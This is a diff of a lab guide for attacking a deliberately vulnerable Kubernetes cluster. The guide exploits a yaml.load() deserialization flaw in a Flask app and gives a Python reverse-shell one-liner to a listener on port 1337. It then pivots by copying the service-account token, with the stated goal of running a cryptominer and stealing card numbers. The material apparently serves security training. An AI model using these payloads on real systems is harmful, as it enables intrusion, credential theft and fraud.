@@ -1,10 +1,12 @@
 ## Attacking a Kubernetes Cluster
 
 ### Start the Vulnerable K8s Cluster
+
 1. Run `./setup_insecure_kube.sh` to start the vulnerable K8s Cluster. Wait for the command to be done
 2. Run `./setup_flask_stack.sh` to start the flask stack to be run on the cluster. Wait for the command to complete
 
 ### Verifying that the K8s stack is running
+
 1. Run `kubectl get pods` should give you something like this:
 
     ```
@@ -32,6 +34,7 @@ It will be something like this `http://<IP>:<someport>`
 Once you open in your browser, you must see this response: `Please POST JSON requests to this URL`. This means the service running correctly.
 
 ### Generating Artifacts
+
 1. In a separate terminal or browser make an HTTP GET request to `http://<IP>:<someport>/generate`
 It should come back with this response:
     ```
@@ -54,6 +57,7 @@ Status: Success
 #### Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉
 
 ### Exploiting a Deserialization Flaw
+
 * Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.
 * Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.
 * Run: `cd payloads`
@@ -75,6 +79,7 @@ Server: nginx/1.11.13
 * Now go to the `/status` url, and you should see this (dump of all the environment variables)
 
 ### Reverse TCP Shell on our K8s Cluster
+
 * you should be in the payloads directory. Open `reverse_shell.yml` with `atom reverse_shell.yml`
 * change the external IP address to your VM's IP address with ifconfig. Also make sure that port 1337 is available on your VM
     `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.3\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`
@@ -107,6 +112,7 @@ Now you can interact with your target app and backend K8s cluster
 **NOTE: Do NOT use the clear or Commd/Ctrl+C key. you will lose access to the shell**
 
 ### Pivoting to K8s cluster
+
 * Navigate to `cd /run/secrets/kubernetes.io/serviceaccount` and run `ls -al`
 * open and copy the token with `cat token` and copy to clipboard
 * Now run: `export TOKEN=(paste token value here)`
